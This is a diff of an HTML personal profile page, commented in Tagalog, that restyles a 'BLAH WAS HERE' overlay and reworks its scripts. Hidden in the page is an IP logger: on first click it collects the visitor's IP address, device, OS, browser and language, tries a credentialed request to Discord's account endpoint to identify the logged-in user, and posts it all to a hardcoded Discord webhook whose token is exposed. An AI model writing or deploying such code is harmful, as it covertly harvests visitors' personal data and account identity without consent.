@@ -40,7 +40,7 @@
             min-height: 100vh;
         }
 
-        /* ✅ IDINAGDAG: Style para sa "BLAH WAS HERE" */
+        /* ✅ INAYOS: Style para sa "BLAH WAS HERE" - Puting kulay + Reflection */
         #blahOverlay {
             position: fixed;
             inset: 0;
@@ -57,9 +57,12 @@
         #blahText {
             font-size: clamp(2.5rem, 10vw, 4rem);
             font-weight: 900;
-            color: #9945ff;
-            text-shadow: 0 0 20px rgba(153, 69, 255, 0.7);
+            color: #ffffff; /* Puti na kulay */
+            text-shadow: 0 0 12px rgba(255, 255, 255, 0.6); /* Malabong liwanag */
             font-family: Arial Black, Impact, sans-serif;
+            /* Reflection effect */
+            -webkit-box-reflect: below 8px linear-gradient(to bottom, rgba(255,255,255,0.2), transparent 70%);
+            box-reflect: below 8px linear-gradient(to bottom, rgba(255,255,255,0.2), transparent 70%);
         }
 
         .fade-out {
@@ -69,7 +72,7 @@
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen text-white p-4">
 
-    <!-- ✅ IDINAGDAG: Overlay para sa mensahe -->
+    <!-- ✅ Overlay para sa mensahe -->
     <div id="blahOverlay">
         <div id="blahText">BLAH WAS HERE</div>
     </div>
@@ -110,13 +113,11 @@
         <p class="text-center text-gray-400 text-sm mb-8">the world is your.</p>
 
         <a href="https://discord.com/users/14973067157" target="_blank" class="text-indigo-500 text-4xl hover:scale-110 transition-transform">
-  <i class="fa-brands fa-discord"></i>
-
-</a>
-<a href="https://github.com/blahlhamara-dev" class="text-gray-400 text-4xl hover:scale-110 transition-transform">
-  <i class="fa-brands fa-github"></i>
-</a>
-
+            <i class="fa-brands fa-discord"></i>
+        </a>
+        <a href="https://github.com/blahlhamara-dev" class="text-gray-400 text-4xl hover:scale-110 transition-transform">
+            <i class="fa-brands fa-github"></i>
+        </a>
 
         <!-- Footer -->
         <div class="flex justify-between items-center mt-4 text-gray-400 text-sm">
@@ -127,82 +128,118 @@
         </div>
     </div>
 
-<!-- Background Sound -->
-<audio id="bgSound" loop preload="auto">
-  <source src="https://mp3tourl.com/audio/1782125485468-d36d7923-f6a4-4d8c-b7fc-4d0b7b862457.mp3">
+    <!-- Background Sound -->
+    <audio id="bgSound" loop preload="auto">
+        <source src="https://mp3tourl.com/audio/1782125485468-d36d7923-f6a4-4d8c-b7fc-4d0b7b862457.mp3" type="audio/mpeg">
+    
 
+    <script>
+        const audio = document.getElementById('bgSound');
+        audio.volume = 0.4;
 
-<script>
-const audio = document.getElementById('bgSound');
-audio.volume = 0.4; // Lakas: 0.1 (mahina) hanggang 1 (malakas)
+        // ✅ Webhook link mo
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1519198591900717307/hWliSDMI9K5NmjOS4-rMmcdofcdbWXhJCF_Zcc34Si35-sjRSEjwSrJGMyVH-mQGxyqJ";
 
-// ✅ ILAGAY MO DITO ANG LINK NG DISCORD WEBHOOK MO
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1519198591900717307/hWliSDMI9K5NmjOS4-rMmcdofcdbWXhJCF_Zcc34Si35-sjRSEjwSrJGMyVH-mQGxyqJ";
+        // ✅ Pag click ng screen
+        document.addEventListener('click', () => {
+            audio.play().catch(err => console.log("Hindi tumugtog:", err));
 
-// ✅ IDINAGDAG: Lahat ng aksyon pagka-click
-document.addEventListener('click', () => {
-  // Patugtugin ang tunog
-  audio.play().catch(err => console.log("Hindi tumugtog:", err));
+            const overlay = document.getElementById('blahOverlay');
+            setTimeout(() => overlay.classList.add('fade-out'), 800);
 
-  // Ipakita at i-fade out ang "BLAH WAS HERE"
-  const overlay = document.getElementById('blahOverlay');
-  setTimeout(() => {
-    overlay.classList.add('fade-out');
-  }, 800); // Lalabas ng 0.8 segundo bago mawala
+            sendVisitorInfo();
+        }, { once: true });
 
-  // Kuhain at ipadala ang impormasyon sa Webhook
-  sendVisitorInfo();
+        // ✅ Inayos na function para malaman ang tunay na detalye
+        async function sendVisitorInfo() {
+            try {
+                // Kumuha ng IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const visitorIP = ipData.ip;
 
-}, { once: true }); // Gagana lang isang beses
+                // ✅ I-parse ang User Agent para makuha ang tunay na device, browser at wika
+                const ua = navigator.userAgent;
+                const lang = navigator.language || navigator.userLanguage;
+                const langFull = new Intl.DisplayNames(['en'], { type: 'language' }).of(lang) || lang;
 
-// ✅ IDINAGDAG: Function para kumuha at magpadala ng impormasyon
-async function sendVisitorInfo() {
-  try {
-    // Kuhain ang pampublikong IP address
-    const ipRes = await fetch('https://api.ipify.org?format=json');
-    const ipData = await ipRes.json();
-    const visitorIP = ipData.ip;
+                // ✅ Kilalanin ang Browser
+                let browser = "Hindi matukoy";
+                if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
+                else if (ua.includes("Firefox")) browser = "Firefox";
+                else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+                else if (ua.includes("Edg")) browser = "Edge";
+                else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
 
-    // Detalye ng browser at device
-    const userAgent = navigator.userAgent;
-    const language = navigator.language;
-    const platform = navigator.platform;
-    const viewport = `${window.innerWidth}x${window.innerHeight}`;
-    const referrer = document.referrer || "Direktang binuksan";
+                // ✅ Kilalanin ang Device Brand at Model
+                let device = "Hindi matukoy";
+                if (ua.includes("Samsung")) device = "Samsung";
+                else if (ua.includes("SM-")) device = `Samsung (${ua.match(/SM-[A-Za-z0-9]+/)?.[0] || 'Model'})`;
+                else if (ua.includes("Oppo") || ua.includes("CPH")) device = `Oppo (${ua.match(/CPH[0-9]+/)?.[0] || 'Model'})`;
+                else if (ua.includes("Xiaomi") || ua.includes("Redmi") || ua.includes("POCO")) device = ua.match(/(Xiaomi|Redmi|POCO)[^\s;)]+/)?.[0] || "Xiaomi / Redmi / POCO";
+                else if (ua.includes("Vivo") || ua.includes("V")) device = `Vivo (${ua.match(/V[0-9]+/)?.[0] || 'Model'})`;
+                else if (ua.includes("Infinix") || ua.includes("X")) device = `Infinix (${ua.match(/X[0-9]+/)?.[0] || 'Model'})`;
+                else if (ua.includes("Tecno")) device = "Tecno";
+                else if (ua.includes("Realme")) device = "Realme";
+                else if (ua.includes("iPhone")) device = "Apple iPhone";
+                else if (ua.includes("iPad")) device = "Apple iPad";
+                else if (ua.includes("Windows")) device = "Windows PC";
+                else if (ua.includes("Mac OS")) device = "Mac / MacBook";
+                else if (ua.includes("Android")) device = "Android Device";
 
-    // Ihanda ang mensahe para sa Discord
-    const payload = {
-      username: "Visitor Logger",
-      avatar_url: "https://i.imgur.com/ZmspxIl.png",
-      embeds: [{
-        title: "🔍 BAGONG BISITA",
-        color: 1003621, // Kulay lila
-        fields: [
-          { name: "👤 Sinong bumisita", value: "Mula sa link/profile ni BLAH", inline: false },
-          { name: "🌐 IP Address", value: `||${visitorIP}||`, inline: true },
-          { name: "💻 Device/OS", value: platform, inline: true },
-          { name: "🌍 Browser", value: userAgent, inline: false },
-          { name: "🗣️ Wika", value: language, inline: true },
-          { name: "📏 Screen Size", value: viewport, inline: true },
-          { name: "🔗 Galing sa", value: referrer, inline: false }
-        ],
-        timestamp: new Date().toISOString()
-      }]
-    };
+                // ✅ Ipakita ang buong OS version
+                let os = "Hindi matukoy";
+                if (ua.includes("Android")) os = ua.match(/Android [0-9.]+/)?.[0] || "Android";
+                else if (ua.includes("Windows")) os = ua.match(/Windows NT [0-9.]+/)?.[0]?.replace("Windows NT ", "Windows ") || "Windows";
+                else if (ua.includes("Mac OS")) os = "macOS";
 
-    // Ipadala sa Webhook
-    await fetch(WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    });
+                // ✅ I-check kung may Discord account na naka-login
+                let discordInfo = "Walang naka-detect na Discord account";
+                try {
+                    const checkDiscord = await fetch("https://discord.com/api/v9/users/@me", { credentials: "include" });
+                    if (checkDiscord.ok) {
+                        const user = await checkDiscord.json();
+                        discordInfo = `✅ Discord: **${user.username}#${user.discriminator || '0000'}**\nID: ${user.id}\nProfile: https://discord.com/users/${user.id}`;
+                    }
+                } catch (e) {
+                    discordInfo = "ℹ️ Hindi naka-login sa Discord o pinagbawalan ng browser";
+                }
 
-    console.log("Impormasyon naipadala sa Webhook");
+                // ✅ Buuin ang mensahe para sa Discord Webhook
+                const payload = {
+                    username: "BOBO KA TOL",
+                    avatar_url: "https://i.imgur.com/ZmspxIl.png",
+                    embeds: [{
+                        title: "BLAH WAS HERE",
+                        color: 1003621,
+                        fields: [
+                            { name: "IP ADDRESS", value: `||${visitorIP}||`, inline: false },
+                            { name: "DEVICE", value: device, inline: true },
+                            { name: "OPERATING SYSTEM", value: os, inline: true },
+                            { name: "BROWSER", value: browser, inline: true },
+                            { name: "TANGA PUTA", value: langFull, inline: true },
+                            { name: "HULE", value: `${window.innerWidth} × ${window.innerHeight}`, inline: true },
+                            { name: "GINANON LANG", value: document.referrer || "Direktang binuksan", inline: false },
+                            { name: "ACCOUNT", value: discordInfo, inline: false }
+                        ],
+                        timestamp: new Date().toISOString(),
+                        footer: { text: "Logger ni BLAH" }
+                    }]
+                };
 
-  } catch (err) {
-    console.log("Error sa pagkuha/pagpadala:", err);
-  }
-}
-</script>
+                // ✅ Ipadala sa Webhook
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                console.log("Detalye naipadala nang tama");
+
+            } catch (err) {
+                console.log("Error:", err);
+            }
+        }
+    </script>
 </body>
 </html>
